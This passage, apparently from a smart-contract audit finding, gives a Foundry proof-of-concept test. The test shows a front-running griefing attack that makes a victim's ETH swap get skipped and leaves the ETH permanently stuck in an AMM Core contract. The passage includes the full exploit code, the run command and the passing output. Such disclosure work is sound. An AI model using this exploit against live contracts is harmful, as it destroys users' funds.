ans:\n * 1. msg.value (ETH) is sent from Router to Core\n * 2. The debt tracking is NEVER updated\n * 3. ETH is stuck in Core forever with no way to recover\n * \n * ATTACK VECTOR:\n * 1. Victim submits swap tx with a reasonable sqrtRatioLimit\n * 2. Attacker front-runs to move price EXACTLY to victim's limit\n * 3. Victim's tx executes: sqrtRatio == sqrtRatioLimit\n * 4. Swap block skipped, debt not tracked, ETH permanently lost\n */\ncontract CoreETHStuckForeverTest is FullTest {\n    using CoreLib for *;\n    \n    address constant ATTACKER = address(0xA77ac1eb);\n    address constant VICTIM = address(0xFEED);\n    \n    PoolKey ethPoolKey;\n    \n    function setUp() public override {\n        super.setUp();\n        \n        // Setup accounts\n        vm.deal(VICTIM, 10 ether);\n        vm.deal(ATTACKER, 100 ether);\n        \n        // Create ETH pool at tick 0 with tick spacing 1\n        ethPoolKey = createETHPool(0, 3000, 1);\n        \n        // Add substantial liquidity for realistic swap\n        token1.transfer(address(this), 500 ether);\n        token1.approve(address(positions), type(uint256).max);\n        vm.deal(address(this), 500 ether);\n        \n        createPosition(ethPoolKey, MIN_TICK, MAX_TICK, 500 ether, 500 ether);\n        \n        vm.prank(ATTACKER);\n        token1.approve(address(router), type(uint256).max);\n    }\n    \n    /**\n     * @notice Demonstrates a griefing attack (front-running) that forces victim's sent ETH to be stuck in Core contract forever\n     *\n     * 1. Pool starts at tick 0\n     * 2. Victim submits tx wanting to swap 10 ETH for token1 with limit at tick -500\n     * 3. Attacker front-runs, moves price to exactly tick -500\n     * 4. Victim's tx executes -> sqrtRatio == sqrtRatioLimit -> swap is skipped -> ETH stuck in Core contract forever\n     * 5. Attacker back-runs to restore price [OPTIONAL]\n     */\n    function test_GriefingAttackForcesVictimETHToBeStuckInCore() public {\n        console.log(\"=== Griefing Attack Forces Victim's ETH to Be Stuck in Core ===\\n\");\n        console.log(\"=== Attack Motivation: Griefing, not profit ===\\n\");\n\n        uint256 attackerETHBalanceInitial = ATTACKER.balance;\n        uint256 attackerToken1BalanceInitial = token1.balanceOf(ATTACKER);\n\n        PoolId poolId = ethPoolKey.toPoolId();\n        PoolState stateInitial = core.poolState(poolId);\n        int32 tickInitial = stateInitial.tick();\n        console.log(\"Pool tick initial:\", tickInitial);\n        \n        // Now victim wants to swap 10 ETH for token1 with a limit somewhere below current price\n        // Let's say victim sets limit at tick (tickInitial - 500) (a reasonable floor)\n        int32 victimLimitTick = tickInitial - 500;\n        SqrtRatio victimLimit = tickToSqrtRatio(victimLimitTick);\n        \n        console.log(\"Victim's limit tick:\", victimLimitTick);\n        console.log(\"Victim wants to swap: 10 ETH\");\n\n        // ATTACKER FRONT-RUN: Move price to exactly victim's limit\n        console.log(\"\\n  --- Attacker Front-Run ---\");\n        console.log(\"Attacker sells ETH to move price DOWN to victim's limit\");\n\n        uint256 attackerToken1BalanceBeforeFrontrun = token1.balanceOf(ATTACKER);\n        \n        // Attacker sells ETH to push price down to victim's limit tick\n        vm.prank(ATTACKER);\n        router.swap{value: 100 ether}(\n            ethPoolKey,\n            false,          // isToken1 = false (selling ETH)\n            100 ether,      // large swap to move price\n            victimLimit,    // stop exactly at victim's limit!\n            0,\n            type(int256).min,\n            ATTACKER\n        );\n        \n        PoolState stateAfterFrontrun = core.poolState(poolId);\n        int32 tickAfterFrontrun = stateAfterFrontrun.tick();\n        console.log(\"Pool tick after front-run:\", tickAfterFrontrun);\n        console.log(\"Victim's limit tick:\", victimLimitTick);\n\n        uint256 attackerToken1BalanceAfterFrontrun = token1.balanceOf(ATTACKER);\n        uint256 attackerToken1ReceivedAfterFrontrun = attackerToken1BalanceAfterFrontrun - attackerToken1BalanceBeforeFrontrun;\n        console.log(\"Attacker Token1 received:\", attackerToken1ReceivedAfterFrontrun);\n        \n        // VICTIM'S TX EXECUTES\n        console.log(\"\\n  --- Victim's Transaction ---\");\n\n        // Record balances\n        uint256 coreETHBalanceBefore = address(core).balance;\n        uint256 victimETHBalanceBefore = VICTIM.balance;\n        uint256 victimToken1BalanceBefore = token1.balanceOf(VICTIM);\n\n        uint256 victimSwapAmount = 10 ether;\n        \n        vm.prank(VICTIM);\n        PoolBalanceUpdate victimUpdate = router.swap{value: victimSwapAmount}(\n            ethPoolKey,\n            false,          // isToken1 = false (selling ETH)\n            int128(int256(victimSwapAmount)),\n            victimLimit,    // Same limit - now equals current price!\n            0,\n            type(int256).min,\n            VICTIM\n        );\n        \n        console.log(\"Victim swap delta0:\", victimUpdate.delta0());\n        console.log(\"Victim swap delta1:\", victimUpdate.delta1());\n\n        PoolState stateAfterVictimSwap = core.poolState(poolId);\n        int32 tickAfterVictimSwap = stateAfterVictimSwap.tick();\n        console.log(\"\\n  Pool tick after victim swap:\", tickAfterVictimSwap);\n\n        // Results\n        uint256 coreETHBalanceAfter = address(core).balance;\n        uint256 victimETHBalanceAfter = VICTIM.balance;\n        uint256 victimToken1BalanceAfter = token1.balanceOf(VICTIM);\n        \n        uint256 ethStuckInCore = coreETHBalanceAfter - coreETHBalanceBefore;\n        uint256 victimETHLoss = victimETHBalanceBefore - victimETHBalanceAfter;\n        uint256 victimToken1Received = victimToken1BalanceAfter - victimToken1BalanceBefore;\n\n        console.log(\"\\n  === ATTACK RESULTS ===\");\n        console.log(\"Victim ETH lost:\", victimETHLoss);\n        console.log(\"Victim Token1 received:\", victimToken1Received);\n\n        assertEq(victimETHLoss, victimSwapAmount, \"Victim should have lost all sent ETH\");\n        assertEq(victimToken1Received, 0, \"Victim should have received no token1\");\n\n        console.log(\"\\n  ETH stuck in Core:\", ethStuckInCore);\n\n        // ATTACKER BACK-RUN: To restore price and retrieve their assets [OPTIONAL]\n        console.log(\"\\n  --- Attacker Back-Run [OPTIONAL] ---\");\n        console.log(\"Attacker buys back ETH to restore price and retrieve their assets\");\n\n        // Buy ETH (sell token1) to push price up\n        vm.prank(ATTACKER);\n        PoolBalanceUpdate attackerUpdate = router.swap{value: 0}(\n            ethPoolKey,\n            true,           // isToken1 = true (selling token1 to get ETH)\n            int128(int256(attackerToken1ReceivedAfterFrontrun)),   // swap token1 received from front-run\n            MAX_SQRT_RATIO, // no limit (let price go up)\n            0,\n            type(int256).min,\n            ATTACKER\n        );\n\n        console.log(\"Attacker swap delta0:\", attackerUpdate.delta0());\n        console.log(\"Attacker swap delta1:\", attackerUpdate.delta1());\n\n        PoolState stateAfterAttackerBackrun = core.poolState(poolId);\n        int32 tickAfterAttackerBackrun = stateAfterAttackerBackrun.tick();\n        console.log(\"\\n  Pool tick after attacker back-run:\", tickAfterAttackerBackrun);\n        console.log(\"(* Restore price to almost initial price!!! (Attacker eats small loss from swap and gas fees) *)\");\n\n        uint256 attackerETHBalanceEnd = ATTACKER.balance;\n        uint256 attackerToken1BalanceEnd = token1.balanceOf(ATTACKER);\n\n        uint256 attackerETHAttackCost = attackerETHBalanceInitial - attackerETHBalanceEnd;\n        uint256 attackerToken1AttackCost = attackerToken1BalanceInitial - attackerToken1BalanceEnd;\n\n        console.log(\"\\n  === ATTACKER COSTS (small attack costs) ===\");\n        console.log(\"Attacker ETH Attack Cost:\", attackerETHAttackCost, \"wei (+ small gas fees)\");\n        console.log(\"Attacker Token1 Attack Cost:\", attackerToken1AttackCost, \"smallest unit of token1\");\n\n        console.log(\"\\n  === Attack Motivation: Griefing, not profit ===\");\n    }\n}\n```\n\n**Run Command**:\n\n```bash\nforge test --match-contract \"CoreETHStuckForeverTest\" -vvv\n```\n\n**Test Output**:\n\n```bash\n[PASS] test_GriefingAttackForcesVictimETHToBeStuckInCore() (gas: 218097)\nLogs:\n  === Griefing Attack Forces Victim's ETH to Be Stuck in Core ===\n\n  === Attack Motivation: Griefing, not profit ===\n\n  Pool tick initial: 0\n  Victim's limit tick: -500\n  Victim wants to swap: 10 ETH\n\n  --- Attacker Front-Run ---\n  Attacker sells ETH to move price DOWN to victim's limit\n  Pool tick after front-run: -500\n  Victim's limit tick: -500\n  Attacker Token1 received: 124984313817666655\n\n  --- Victim's Transaction ---\n  Victim swap delta0: 0\n  Victim swap delta1: 0\n\n  Pool tick after victim swap: -500\n\n  === ATTACK RESULTS ===\n  Victim ETH lost: 10000000000000000000\n  Victim Token1 received: 0\n\n  ETH stuck in Core: 10000000000000000000\n\n  --- Attacker Back-Run [OPTIONAL] ---\n  Attacker buys back ETH to restore price and retrieve their assets\n  Attacker swap delta0: -125015563786579419\n  Attacker swap delta1: 124984313817666655\n\n  Pool tick after attacker back-run: -1\n  (* Restore price to almost initial price!!! (Attacker eats small loss from swap and gas fees) *)\n\n  === ATTACKER COSTS (small attack costs) ===\n  Attacker ETH Attack Cost: 50 wei (+ small gas fees)\n  Attacker Token1 Attack Cost: 0 smallest unit of token1\n\n  === Attack Motivation: Griefing, not profit ===\n```",
